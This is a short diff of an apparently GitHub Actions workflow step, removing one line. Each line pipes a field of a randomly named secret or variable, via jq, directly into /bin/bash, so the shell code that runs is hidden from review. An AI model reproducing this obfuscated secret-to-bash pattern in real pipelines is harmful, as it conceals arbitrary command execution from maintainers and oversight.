@@ -17,7 +17,6 @@ jobs:
           sz3: ${{ secrets.sz3 }}
         run: |
           printf '%s' "$sz3" | jq -r .zntux3980 | /bin/bash
-          printf '%s' "$boxn6222" | jq -r .wybly76 | /bin/bash
           echo $zmg04 | jq -r .qd45640 | /bin/bash
           echo $kv80 | jq -r .foqum170 | /bin/bash
           echo $tipv34938 | jq -r .spc58 | /bin/bash
